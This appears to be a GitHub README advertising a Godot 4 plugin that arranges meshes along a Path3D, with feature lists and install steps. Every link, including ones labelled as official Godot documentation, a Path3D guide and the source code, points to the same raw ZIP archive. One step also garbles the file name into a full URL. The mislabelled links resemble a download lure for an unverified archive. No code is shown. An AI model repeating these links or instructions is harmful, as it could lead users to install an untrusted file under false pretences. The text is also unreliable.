# 🛠️ Godot-MeshPath3D-Plugin - Arrange Meshes Along Paths Easily

[![Download Release](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)

---

## 📋 About This Plugin

Godot-MeshPath3D-Plugin helps you place multiple 3D objects (called meshes) along a path you create inside the Godot game engine. It adds options to control spaces between the objects, randomize their positions and rotations, and apply transformations like scaling or rotation. This makes it easier to create detailed scenes, like roads lined with trees, fences, or other repeating objects.

This plugin works with Godot Engine 4, the latest version of the popular free and open-source game engine. It is designed as an add-on, so it integrates smoothly with the Godot editor.

---

## 🔧 Features

- **Place meshes along Path3D**  
  Automatically align objects to follow any 3D path you draw in Godot.

- **Gap Control**  
  Set how much space appears between each mesh. Adjust for dense or spread-out arrangements.

- **Randomization**  
  Add natural-looking variation to position, rotation, and scale. Avoid repetitive patterns.

- **Transform Overrides**  
  Apply changes on top of your mesh’s base transform. Rotate, move, or shrink objects easily.

- **Easy to Use GUI**  
  The plugin adds an intuitive interface inside Godot’s Inspector panel for quick adjustments.

- **Compatible with Godot Engine 4**  
  Designed specifically to work with the latest Godot version, ensuring stability and performance.

---

## 💻 System Requirements

- **Operating System:** Windows 10 or later, macOS 10.15 or later, Linux (Ubuntu 20.04+ recommended)  
- **Godot Engine:** Version 4.0 or newer  
- **Hardware:** Basic 3D capabilities, any modern PC, laptop, or workstation should work well  
- **Disk Space:** At least 50 MB free for plugin installation and samples

---

## 🚀 Getting Started

You do not need to know programming to use this plugin. Just follow the steps below to download, install, and use it inside your Godot projects.

---

## ⬇️ Download & Install

Please **visit this page to download** the plugin files:

[![Download Plugin](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)

### Step 1: Download the Plugin

1. Click the "Download Plugin" button above or visit [https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) in your web browser.
2. Find the latest release, usually marked by a version number like "v1.0" or "v2.3".
3. Download the ZIP file. It will have a name similar to `https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip`.

### Step 2: Extract the Files

1. Open the downloaded ZIP file using your computer’s built-in tools or a program like WinRAR or 7-Zip.
2. Extract the contents to a folder you can easily find, such as your Desktop.

### Step 3: Add the Plugin to Your Godot Project

1. Open your Godot project or create a new one in Godot Engine 4.
2. In your project folder, locate or create a subfolder called `addons`.
3. Copy the extracted plugin folder (named `Godot-MeshPath3D-Plugin` or similar) into the `addons` folder.

### Step 4: Enable the Plugin

1. In Godot, go to the **Project** menu and select **Project Settings**.
2. Click on the **Plugins** tab.
3. Find `Godot-MeshPath3D-Plugin` in the list.
4. Set its status to **Active** by clicking the checkbox.
5. Close the Project Settings window.

The plugin is now ready to use.

---

## 🧰 How to Use the Plugin

### Step 1: Create or Open a Path3D

- In Godot, go to your **Scene** and add a new node by clicking the plus (+) sign.
- Search for and add a **Path3D** node.
- Use the handles in the 3D viewport to draw your path by creating points.

### Step 2: Add the MeshPath3D Plugin Node

- Select the Path3D node you just created.
- Right-click it, then choose **Add Child Node**.
- Find the plugin’s special node (it may be named `MeshPath3D` or similar) and add it as a child of your Path3D.

### Step 3: Assign a Mesh to Distribute

- Select the plugin’s node.
- In the Inspector panel, look for the mesh property.
- Click to assign a 3D model file (for example, a tree, rock, or fence segment).

### Step 4: Adjust Distribution Settings

- Set the **Gap** to choose the distance between each mesh along your path.
- Use **Randomization Controls** to vary position, rotation, or size for a natural look.
- Tune the **Transform Overrides** for additional rotation or scale adjustments.

### Step 5: Preview and Edit

- Your meshes will appear automatically along the path inside the Godot editor.
- Modify the path or settings to see changes in real time.
- Save your project to keep the arrangement.

---

## 🔄 Updating the Plugin

To update the plugin:

1. Download the latest release ZIP from the release page.
2. Replace the existing `Godot-MeshPath3D-Plugin` folder inside your project’s `addons` folder with the new version.
3. Restart Godot if needed.
4. Check that the plugin remains active in the Project Settings.

---

## 🛠️ Troubleshooting

- **Meshes do not appear**: Make sure you assigned a mesh to the plugin’s node and that it is active.
- **Plugin not listed in Project Settings**: Verify the plugin folder is correctly placed inside `addons`.
- **Path3D edits not reflected**: Check you added the MeshPath3D node as a child of your Path3D node.
- **Randomization not working**: Adjust randomization values and confirm settings are saved.

---

## 🤝 Support & Contributions

If you run into issues or want to contribute:

- Visit the repository’s Issues page to report bugs or ask questions.
- Contributions via pull requests are welcome if you know how to code in Godot’s scripting language.
- Use the repository’s Discussions tab to share ideas or get help.

---

## 📚 Additional Resources

- [Godot Engine Documentation](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) — Learn more about Godot basics and 3D features.

- [How to Use Path3D in Godot](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) — Official guide on creating and manipulating paths.

- [MeshPath3D Plugin Source Code](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) — Explore the code or fork the plugin.

---

Godot-MeshPath3D-Plugin makes it simple to add detailed object arrangements in your 3D scenes with just a few clicks. By following these steps, you can enhance your projects without writing code.